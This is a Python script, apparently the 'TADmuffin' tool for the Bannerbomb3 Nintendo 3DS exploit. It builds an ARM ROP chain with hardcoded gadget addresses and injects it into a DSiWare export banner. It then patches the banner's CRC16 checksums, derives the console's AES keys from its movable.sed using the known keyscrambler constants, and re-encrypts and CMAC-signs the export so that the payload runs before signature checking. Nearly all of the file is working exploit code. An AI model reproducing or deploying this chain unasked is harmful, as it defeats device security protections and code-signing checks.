# python3
from Cryptodome.Hash import CMAC
from Cryptodome.Cipher import AES
import os,sys,random,hashlib,struct
from binascii import hexlify

# payload rop ------------------------------------------------------------------------------------------------------------------------
# ------------------------------------------------------------------------------------------------------------------------------------

ROP=b""
PAYLOAD=b""
offset=0

DEST=0x006AA000 # + 80200 = 72A200
ROP=DEST
FILE=DEST-0x1000
PAYSIZE=0x00080200
GARBAGE=0xdeadbeef

ENTRY=0x0ffffe48
POP_PC=0x0011a1d4
POP_R0PC=0x00146760
POP_R0R2PC=0x00164654+1
POP_R0R3PC=0x0022c0e4+1
ROP_STRB_R4R0=0x00243788
STACK_PIVOT=0x001d5b40 #: ldmdb r6, {r4, r5, r6, ip, sp, lr, pc} ^ 40 5b 1d 00
IFile_Read=0x001c3140 + 4
FS_MountSdmc=0x001a1654 + 4
IFile_Open=0x001c790c + 4
STR_YS=0x0028cb60

PAYLOAD_PATH=0x0
NULL_ADDR=0x0

def w(n):
	global PAYLOAD,offset
	offset+=4
	PAYLOAD += struct.pack("<I",n)
	
def wchar16(s):
	global PAYLOAD,offset
	offset+=len(s)*2
	PAYLOAD += s.encode("utf-16le")
	
def w_insert(word, target):
	global PAYLOAD,ENTRY
	index=target-ENTRY
	PAYLOAD = PAYLOAD[:index] + struct.pack("<I",word) + PAYLOAD[index+4:]

offset=ENTRY

#at no point should this rop string have a null! (two consecutive 00s, 2byte aligned)
w(POP_R0PC)
w(	STR_YS)

w(FS_MountSdmc)
w(	GARBAGE)
w(	0xdeadbe00) # r4
w(	GARBAGE)

w(POP_R0PC)
T1=offset
w(	GARBAGE) 	# ??? NULL_ADDR need to figure out

w(ROP_STRB_R4R0)
w(	GARBAGE)

w(POP_R0R2PC)
w(	FILE)
T2=offset
w(	GARBAGE) 	# ??? PAYLOAD_PATH need to figure out
w(	0x00010001) # high bit to continue string is ingnored luckily

w(IFile_Open)
w(	GARBAGE)
w(	GARBAGE)
w(	GARBAGE)
w(	GARBAGE)
w(	GARBAGE)

w(POP_R0R3PC)
w(	FILE)
w(	FILE+32)
w(	DEST)
w(	PAYSIZE)

w(IFile_Read)
w(	GARBAGE)
w(	GARBAGE)
w(	offset+0x10) #r6 - pivot address, see next comment
w(	DEST)
w(	POP_PC)
w(	POP_PC)

#stack pivot address (held in r6), previous 3 words will be the pivot args, sp, lr, and pc. lr is poppc just in case
w(STACK_PIVOT)

#these two variables will be placed in their correct spots at the end of rop chain
PAYLOAD_PATH=offset
wchar16("YS:/bb3.bin!") 
NULL_ADDR=offset 

assert(offset & 3 == 0) # make sure offset is still aligned to 4

padsize=(0xd0-(offset-ENTRY))//4
for i in range(padsize):
	w(GARBAGE)

#actual exploit code, will pivot to the beginning ENTRY
w(0x0FFFFF18)
w(GARBAGE)
w(GARBAGE)
w(GARBAGE)
w(STACK_PIVOT)
w(0x0FFFFF18)
w(GARBAGE)
w(0x0FFFFEE8)
w(ENTRY)
w(0x0FFFFF44)
w(POP_PC)
w(GARBAGE)

w_insert(NULL_ADDR-2, T1)
w_insert(PAYLOAD_PATH, T2)

print("__PAYLOAD__")
for i in range(0,len(PAYLOAD),16):
	out="%02X "*16 % struct.unpack("16B", PAYLOAD[i+0:i+16])
	out2="%08X: " % (ENTRY+i)
	print(out2+out)
print(padsize)

# tadmuffin --------------------------------------------------------------------------------------------------------------------------
# ------------------------------------------------------------------------------------------------------------------------------------

tidlow=0xF00D43D5

keyx=0x6FBB01F872CAF9C01834EEC04065EE53
keyy=0x0 #get this from movable.sed - console unique
F128=0xffffffffffffffffffffffffffffffff
C   =0x1FF9E9AAC5FE0408024591DC5D52768A
cmac_keyx=0xB529221CDDB5DB5A1BF26EFF2041E875

tidstr="%08X" % tidlow
assert(len(tidstr) == 8)
DIR=tidstr+"/"
tad_sections=[b""]*14

def get_keyy(n):
	global keyy
	if len(sys.argv) == 2:
		n=sys.argv[1]
	with open(n,"rb") as f:
		msedlen=len(f.read())
		if(msedlen != 0x140 and msedlen != 0x120):
			print("Error: movable.sed is the wrong size - are you sure this is a movable.sed?")
			sys.exit(1)
		f.seek(0x110)
		temp=f.read(0x10)
		print("ID0: %08x%08x%08x%08x" % struct.unpack("<IIII", hashlib.sha256(temp).digest()[:16]))
		keyy=int(hexlify(temp), 16)

def int16bytes(n):
	return struct.pack(">QQ",(n & 0xffffffffffffffff0000000000000000) >> 64, n & 0xffffffffffffffff)
		
def add_128(a, b):
	return (a+b) & F128

def rol_128(n, shift):
	for i in range(shift):
		left_bit=(n & 1<<127)>>127
		shift_result=n<<1 & F128
		n=shift_result | left_bit
	return n

def normalkey(x,y):	 	#3ds aes engine - curtesy of rei's pastebin google doc, curtesy of plutoo from 32c3
	n=rol_128(x,2) ^ y  #F(KeyX, KeyY) = (((KeyX <<< 2) ^ KeyY) + 1FF9E9AAC5FE0408024591DC5D52768A) <<< 87
	n=add_128(n,C)	  	#https://pastebin.com/ucqXGq6E
	n=rol_128(n,87)	 	#https://smealum.github.io/3ds/32c3/#/113
	return n

def encrypt(message, key, iv):
	cipher = AES.new(key, AES.MODE_CBC, iv )
	return cipher.encrypt(message)

def get_content_block(buff):
	global cmac_keyx
	hash=hashlib.sha256(buff).digest()
	key = int16bytes(normalkey(cmac_keyx, keyy))
	cipher = CMAC.new(key, ciphermod=AES)
	result = cipher.update(hash)
	return result.digest() + b'\x00'*16
		
def rebuild_tad():
	global keyy
	full_namelist=["banner.bin","header.bin"]
	section=""
	content_block=""
	key=normalkey(keyx,keyy)
	for i in range(len(full_namelist)):
		if(os.path.exists(DIR+full_namelist[i])):
			print("encrypting "+DIR+full_namelist[i])
			with open(DIR+full_namelist[i],"rb") as f:
				section=f.read()
			content_block=get_content_block(section)
			tad_sections[i]=encrypt(section, int16bytes(key), content_block[0x10:])+content_block
	with open("%08X.bin" % tidlow,"wb") as f:
		out=b''.join(tad_sections)
		f.write(out+b"\x00"*0x500) #0x500 bytes are don't care padding for footer
	print("Rebuilt to %08X.bin" % tidlow)
	print("Done.")

MODBUS=0xFFFF # STANDARD=0x0000
def fix_crc16(path, offset, size, crc_offset, type):# CRC-16-Modbus Algorithm
	with open(path,"rb+") as f:
		f.seek(offset)
		data=f.read(size)	
		poly=0xA001
		crc = type
		for b in data:
			cur_byte=b & 0xff
			for _ in range(0, 8):
				if (crc & 0x0001) ^ (cur_byte & 0x0001):
					crc = (crc >> 1) ^ poly
				else:
					crc >>= 1
				cur_byte >>= 1
		crc16=crc & 0xFFFF
		print("Patching crc_offset:%04X | msg_offset:%04X | msg_size:%04X..." % (crc_offset, offset, size))
		f.seek(crc_offset)
		f.write(struct.pack("<H",crc16))

def inject_bin(dest, offset): #the payload is constructed from the rop chain at the top of this script
	with open(dest,"rb+") as f:
		f.seek(offset)
		f.write(PAYLOAD*8)

print("|TADmuffin by zoogie|")
print("|_______v1.0________|  Note: This is a simplified TADpole used only for Bannerbomb3")
abspath = os.path.abspath(__file__)
dname = os.path.dirname(abspath)
os.chdir(dname)

print("Using workdir: "+DIR)

try:
	os.mkdir(tidstr)
	print("/%s created" % tidstr)
except:
	print("/%s already exists" % tidstr)
banner_bin=b"\x03\x01"+b"\x00"*(0x4000-2)
header_bin=b"3DFT"+struct.pack(">I",4)+(b"\x42"*0x20)+(b"\x99"*0x10)+struct.pack("<Q",0x0004800500000000+tidlow)+(b"\x00"*0xB0)

with open(DIR+"banner.bin","wb") as f:
	f.write(banner_bin)
with open(DIR+"header.bin","wb") as f:
	f.write(header_bin)
	
print("Injecting payload to banner...")
inject_bin(DIR+"banner.bin",0x240)
print("Fixing crc16s...")
fix_crc16(DIR+"banner.bin", 0x20, 0x820, 0x2, MODBUS)
fix_crc16(DIR+"banner.bin", 0x20, 0x920, 0x4, MODBUS)
fix_crc16(DIR+"banner.bin", 0x20, 0xA20, 0x6, MODBUS)
fix_crc16(DIR+"banner.bin", 0x1240, 0x1180, 0x8, MODBUS)

print("Rebuilding export...")
get_keyy("movable.sed")
#sign_footer() #don't need this for bannerhax - exploit is triggered before footer ecdsa is verified
rebuild_tad()